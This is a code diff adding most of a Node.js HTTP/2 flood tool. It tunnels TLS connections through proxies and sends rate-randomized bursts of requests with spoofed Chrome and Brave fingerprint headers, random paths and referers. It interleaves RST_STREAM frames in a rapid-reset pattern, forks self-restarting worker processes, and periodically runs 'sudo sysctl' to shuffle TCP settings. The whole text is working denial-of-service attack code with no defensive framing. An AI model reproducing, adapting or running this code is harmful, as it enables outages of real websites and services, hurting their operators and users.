+                                tlsSocket.end(() => tlsSocket.destroy())
+                            }
+
+                        } else {
+                            break
+                        }
+                    }
+                })
+
+                tlsSocket.write(Buffer.concat(frames1))
+                function main() {
+                    if (tlsSocket.destroyed) {
+                        return
+                    }
+                    const requests = []
+                    const customHeadersArray = [];
+
+                      if (customHeaders) {
+    const customHeadersList = customHeaders.split('#');
+    for (const header of customHeadersList) {
+        const [name, value] = header.split(':').map(part => part?.trim());
+        if (name && value) {
+            customHeadersArray.push({ [name.toLowerCase()]: value });
+        } else {
+            console.warn(`Invalid header format for: ${header}`);
+        }
+    }
+}
+
+
+                       function rate_range(base) {
+                       const rate_eq = (base * 50) / 100;
+                       const min_range = base - rate_eq;
+                       const max_range = base + rate_eq;
+                       return {
+                       min: Math.max(0, min_range),
+                       max_range
+                       };
+                       }
+                       const calculateRate = () => {
+                       let rate;
+                       if (randrate === "") {
+                       rate = ratelimit;
+                       } else if (randrate.includes('-')) {
+                       let rate_parts = randrate.split('-');
+                       let minimum, maximum;
+                       
+                       if (rate_parts.length === 2) {
+                       try {
+                       minimum = parseInt(rate_parts[0]);
+                       maximum = parseInt(rate_parts[1]);
+                       
+                       if (minimum > maximum) {
+                       rate = getRandomInt(maximum, minimum);
+                       } else {
+                       rate = getRandomInt(minimum, maximum);
+                       }
+                       } catch (err) {
+                       rate = getRandomInt(1, 90);
+                       }
+                       }
+                       } else if (randrate === "true") {
+                       rate = getRandomInt(1, 128);
+                       } else if (randrate !== "") {
+                       try {
+                       const base_rate = parseInt(randrate);
+                       const range = rate_range(base_rate, 50);
+                       rate = getRandomInt(range.min, range.max);
+                       } catch (err) {
+                       rate = getRandomInt(1, 90);
+                       }
+                       }
+                       return rate;
+                       }
+
+    
+                       var rate = calculateRate();
+                       for (var x = 0; x < rate; x++) {
+
+                        const ref = ["same-site", "same-origin", "cross-site"];
+                        const ref1 = ref[Math.floor(Math.random() * ref.length)];
+
+                        const browserVersion = getRandomInt(128, 134);
+                         var brandValue, versionList, fullVersion;
+                         switch (browserVersion) {
+            case 126:
+                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
+                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
+                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
+            case 127:
+                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
+                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
+                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
+            case 128:
+                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
+                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
+                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
+            case 129:
+                brandValue = `\"Google Chrome\";v=\"${browserVersion}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
+                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
+                versionList = `\"Google Chrome\";v=\"${fullVersion}\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\"`;
+                break;
+            case 130:
+                brandValue = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
+                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
+                versionList = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
+                break;
+            default:
+                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
+                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
+                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
+                break;
+                    }
+                    const isBrave = versionList.includes('Brave');
+
+
+                        const acceptHeaderValue = isBrave
+                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
+                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
+
+                        const langValue = isBrave
+                            ? 'en-US,en;q=0.9'
+                            : 'en-US,en;q=0.7';
+
+                        const secGpcValue = isBrave ? "1" : undefined;
+
+                        const secChUaModel = isBrave ? '""' : undefined;
+                        const secChUaMobile = isBrave ? '?0' : undefined;
+
+                        const generateUserAgent = () => {
+                        const getRandomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];
+                        const browsers = [
+                        { name: "Chrome", versions: ["91.0", "92.0", "93.0", "94.0", "95.0"] },
+                        { name: "Firefox", versions: ["89.0", "90.0", "91.0", "92.0"] },
+                        { name: "Safari", versions: ["14.1", "15.0", "15.1", "16.0"] },
+                        { name: "Edge", versions: ["91.0", "92.0", "93.0"] },
+                        { name: "Opera", versions: ["78.0", "79.0", "80.0"] },
+                        { name: "Internet Explorer", versions: ["11.0", "10.0"] }
+                        ];
+                        
+                        const devices = [
+                        { name: "Pixel 6", platform: "Android", version: "12" },
+                        { name: "iPhone 13", platform: "iOS", version: "15" },
+                        { name: "Samsung Galaxy S21", platform: "Android", version: "11" },
+                        { name: "MacBook Pro", platform: "macOS", version: "Monterey" },
+                        { name: "Windows 10 PC", platform: "Windows", version: "10" },
+                        ];
+                        
+                        const engines = [
+                        { name: "Blink", versions: ["91", "92", "93"] },
+                        { name: "Gecko", versions: ["89", "90", "91"] },
+                        { name: "WebKit", versions: ["604", "605", "606"] },
+                        ];
+                        
+                        const osList = [
+                        "Linux", "Windows 10", "macOS Monterey", "iOS 15", "Android 12", "Ubuntu 20.04", "Fedora 34"
+                        ];
+                        
+                        
+                        const features = [
+                        { name: "WebGL", version: "1.0" },
+                        { name: "Service Worker", version: "1.0" },
+                        { name: "ES6", version: "2015" },
+                        { name: "Canvas", version: "2.0" },
+                        
+                        ];
+                        const browser = getRandomItem(browsers);
+                        const device = getRandomItem(devices);
+                        const engine = getRandomItem(engines);
+                        const os = getRandomItem(osList);
+                        const feature = getRandomItem(features);
+                        return `${browser.name}/${getRandomItem(browser.versions)} ` +`(${device.name}; ${device.platform} ${device.version}; ${os}) ` +`${engine.name}/${getRandomItem(engine.versions)} ` +`(KHTML, like Gecko) ${feature.name}/${feature.version}`;
+                        };
+
+                        const secChUa = `${brandValue}`;
+
+                        let randomNum = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
+                        
+                        const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;
+                        
+                        const generateRandomNumber = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+                        const platforms = ["Windows NT 10.0; Win64; x64","Macintosh; Intel Mac OS X 10_15_7","X11; Linux x86_64"];
+                        const platform = platforms[Math.floor(Math.random() * platforms.length)];
+                        var userAgent = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
+                        
+                        var secChUaPlatform, sec_ch_ua_arch, platformVersion;
+                        switch (platform) {
+                        case "Windows NT 10.0; Win64; x64":
+                        secChUaPlatform = "\"Windows\"";
+                        sec_ch_ua_arch = "x86";
+                        platformVersion = "\"10.0.0\"";
+                        break;
+                        case "Macintosh; Intel Mac OS X 10_15_7":
+                        secChUaPlatform = "\"macOS\"";
+                        sec_ch_ua_arch = "arm"
+                        platformVersion = "\"14.5.0\"";
+                        break;
+                        case "X11; Linux x86_64":
+                        secChUaPlatform = "\"Linux\"";
+                        sec_ch_ua_arch = "x86"
+                        platformVersion = "\"5.15.0\"";
+                        break;
+                        default:
+                        secChUaPlatform = "\"Windows\"";
+                        sec_ch_ua_arch = "x86";
+                        platformVersion = "\"10.0.0\"";
+                        break;
+                        }
+                        var pathname = url.pathname;
+                        if (pathname === "") {
+                        pathname = "/"
+                        }
+                        if (pathname.includes('%RAND%')) {
+                        pathname = pathname.replace("%RAND%", random_string(random_int(6, 9)));
+                        }
+                        if (randpath) {
+                        const pathname_length = pathname.length;
+                        if (pathname[pathname_length-1] !== "/") {
+                        pathname = `${pathname}/${random_string(random_int(6, 9))}`;
+                        } else {
+                        pathname = `${pathname}${random_string(random_int(6, 9))}`;
+                        }
+                        }
+                        var referer;
+                        if (refererValue) {
+                        const extensions = ['com', 'net', 'org', 'io', 'co', 'gov'];
+                        const extension = extensions[Math.random(Math.floor() * extensions.length)];
+                        try {
+                        if (refererValue === "RAND") {
+                        referer = `https://${random_string(random_int(6, 9))}.${extension}/`;
+                        } else {
+                        const referer_url = new URL(refererValue);
+                        referer = referer_url.href;
+                        }
+                        } catch (err) {
+                        referer = url.href;
+                        }
+                        }
+                        if (randua1) {
+                        sd = generateUserAgent()
+                        } else {
+                        sd = userAgent
+                        }
+                        const headers = Object.entries({
+                            ":method": reqmethod,
+                            ":authority": url.hostname,
+                            ":scheme": "https",
+                            
+                            ":path": pathname,
+                        }).concat(Object.entries({
+                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
+                            ...(reqmethod === "POST" && { "content-length": "0" }),
+                            ...(reqmethod === "POST" && { "content-type": "application/x-www-form-urlencoded" }),
+                            "sec-ch-ua": secChUa,
+                            ...(cache && { "cache-control": Math.random() < 0.50 ? "max-age=0" : "no-cache" }),
+                            "sec-ch-ua-platform": `\"Windows\"`,
+                            ...(hcookie && { "cookie": hcookie }),
+                            "upgrade-insecure-requests": "1",
+                            "priority": 'u=0, i',
+                            ...(fullHeaders && { "sec-ch-ua-full-version": fullVersion }),
+                            ...(fullHeaders && { "sec-ch-ua-full-version-list": versionList }),
+                            ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
+                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
+                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
+                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
+                            "accept-encoding": encodings[~~Math.random(Math.floor() * encodings.length)],
+                            "accept-language": languages[~~Math.random(Math.floor() * languages.length)],
+                            "user-agent": sd,
+                            ...(fullHeaders && { "sec-ch-ua-arch": sec_ch_ua_arch }),
+                            "accept": acceptHeaderValue,
+                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
+                            ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
+                            ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
+                            "sec-ch-ua-platform": secChUaPlatform,
+                            ...(fullHeaders && { "sec-ch-ua-bitness": "\"64\"" }),
+                            ...(fullHeaders && { "sec-ch-ua-model": "\"\"" }),
+                            ...(referer) && { "referer": referer},
+                            ...(fullHeaders && { "sec-ch-ua-platform-version": platformVersion }),
+                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
+                        }));
+                             
+
+                        
+                  
+                        const combinedHeaders = headers;
+                        
+
+                        
+
+                        const packed = Buffer.concat([
+                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
+                            hpack.encode(combinedHeaders)
+                        ]);
+                        const flags = 0x1 | 0x4 | 0x8 | 0x20;
+                        const encodedFrame = encodeFrame(streamId, 1, packed, flags);
+                        const frame = Buffer.concat([encodedFrame]);
+                        if (rapid && (streamId / 2 > rate && streamId >= 5)) {
+                            tlsSocket.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
+                            } 
+                        if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
+                        const rstStreamFrame = encodeFrame(streamId,  0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0);
+                        tlsSocket.write(Buffer.concat([rstStreamFrame, frame]));
+                        STREAMID_RESET=0;
+                        }
+
+                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
+                        
+    
+                        streamId += 2;
+                        STREAMID_RESET +=2;
+
+                    }
+
+                    tlsSocket.write(Buffer.concat(requests), (err) => {
+                        setTimeout(() => {
+
+                        main()
+                    }, 700 / rate);
+                    })
+                }
+                main()
+            }).on('error', () => {
+                tlsSocket.destroy()
+            })
+            .on('end', () => {
+                if (!statuses["CLOSE"]) statuses["CLOSE"] = 0;
+                statuses["CLOSE"]++;
+            });
+        })
+        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
+    }).once('error', () => { }).once('close', () => {
+        if (shouldCloseSession) {
+            if (tlsSocket) {
+                tlsSocket.end(() => {
+                go();
+                }).on('timeout', () => {
+                    if (!statuses["TIMEOUT"]) statuses["TIMEOUT"] = 0;
+                    statuses["TIMEOUT"]++;
+                    if (tlsSocket) {
+                        tlsSocket.end(() => tlsSocket.destroy());
+                        go();
+                    }
+                })
+                
+            }
+    
+    if (netSocket) {
+        netSocket.end(() => {
+        });
+    }
+}
+    })
+
+    
+    netSocket.on('error', (error) => {
+        cleanup(error);
+    });
+    
+    netSocket.on('close', () => {
+        cleanup();
+    });
+    
+    function cleanup(error) {
+        if (error) {
+        }
+        if (netSocket) {
+            netSocket.destroy();
+        }
+        if (tlsSocket) {
+            tlsSocket.end();
+        }
+    }
+}
+function TCP_CHANGES_SERVER() {
+    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
+    const sackOptions = ['1', '0'];
+    const windowScalingOptions = ['1', '0'];
+    const timestampsOptions = ['1', '0'];
+    const selectiveAckOptions = ['1', '0'];
+    const tcpFastOpenOptions = ['3', '2', '1', '0'];
+
+    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
+    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
+    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
+    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
+    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
+    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];
+
+    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
+net.ipv4.tcp_sack=${sack} \
+net.ipv4.tcp_window_scaling=${windowScaling} \
+net.ipv4.tcp_timestamps=${timestamps} \
+net.ipv4.tcp_sack=${selectiveAck} \
+net.ipv4.tcp_fastopen=${tcpFastOpen}`;
+
+    exec(command, () => { });
+}
+
+const MAX_RAM_PERCENTAGE = 75;
+const RESTART_DELAY = 1000;
+const getRandomHeapSize = () => {
+    const minHeapSize = 512;
+    const maxHeapSize = 2048;
+    return Math.floor(Math.random() * (maxHeapSize - minHeapSize + 1)) + minHeapSize;
+};
+const restartScript = () => {
+    console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
+    for (const id in cluster.workers) {
+        if (cluster.workers[id]) {
+            cluster.workers[id].on('exit', () => {
+            });
+            cluster.workers[id].kill('SIGTERM');
+        }
+    }
+    setTimeout(() => {
+        console.log('[>] Forking new workers...');
+        for (let counter = 1; counter <= threads; counter++) {
+            const heapSize = getRandomHeapSize();
+            cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
+        }
+    }, RESTART_DELAY);
+};
+   const handleRAMUsage = () => {
+    const totalRAM = os.totalmem(); 
+    const usedRAM = totalRAM - os.freemem(); 
+    const ramPercentage = (usedRAM / totalRAM) * 100;
+
+    console.log(`[RAM Check] Total RAM: ${(totalRAM / (1024 ** 3)).toFixed(2)} GB`);
+    console.log(`[RAM Check] Used RAM: ${(usedRAM / (1024 ** 3)).toFixed(2)} GB`);
+    console.log(`[RAM Check] RAM Usage: ${ramPercentage.toFixed(2)}%`);
+
+    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
+        console.log('[!] Maximum RAM usage exceeded:', ramPercentage.toFixed(2), '%');
+        restartScript();
+    }
+};
+
+if (cluster.isMaster) {
+for (let counter = 1; counter <= threads; counter++) {
+        const heapSize = getRandomHeapSize();
+        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
+    }
+    const workers = {}
+
+
+    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
+    console.log(`SENT`);
+
+    cluster.on('exit', (worker, code, signal) => {
+        console.log(`[Worker ${worker.id}] exited. Forking a new worker...`);
+        const heapSize = getRandomHeapSize();
+        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
+    });
+
+    setInterval(handleRAMUsage, 10000);
+
+
+    cluster.on('message', (worker, message) => {
+        workers[worker.id] = [worker, message]
+    })
+    if (debugMode) {
+        setInterval(() => {
+
+            let statuses = {}
+            for (let w in workers) {
+                if (workers[w][0].state == 'online') {
+                    for (let st of workers[w][1]) {
+                        for (let code in st) {
+                            if (statuses[code] == null)
+                                statuses[code] = 0
+
+                            statuses[code] += st[code]
+                        }
+                    }
+                }
+            }
+            console.clear()
+            console.log(new Date().toLocaleString('us'), statuses)
+        }, 1000)
+    }
+
+    setInterval(TCP_CHANGES_SERVER, 5000);
+    setTimeout(() => process.exit(1), time * 1000);
+
+} else {
+    let connection_of_proxy = 1;
+    let active_connection = 0;
+
+function initiateFlood() {
+    for (let x = 0; x < connection_of_proxy; x++) {
+        const flood_interval = setInterval(() => {
+            if (connections !== undefined && connections <= active_connection) {
+                clearInterval(flood_interval);
+                return;
+            }
+
+            if (proxy && proxy.length >= 2) {
+                const [proxyHost, proxyPort] = proxy;
+                const port = parseInt(proxyPort);
+                
+                go(proxyHost, port);
+                active_connection++;
+            }
+        }, delay);
+    }
+}
+
+initiateFlood();
+
+
+
+
+
+    if (debugMode) {
+        setInterval(() => {
+            if (statusesQ.length >= 4)
+                statusesQ.shift()
+
+            statusesQ.push(statuses)
+            statuses = {}
+            process.send(statusesQ)
+        }, 250)
+    }
+
+    setTimeout(() => process.exit(1), time * 1000);
+}
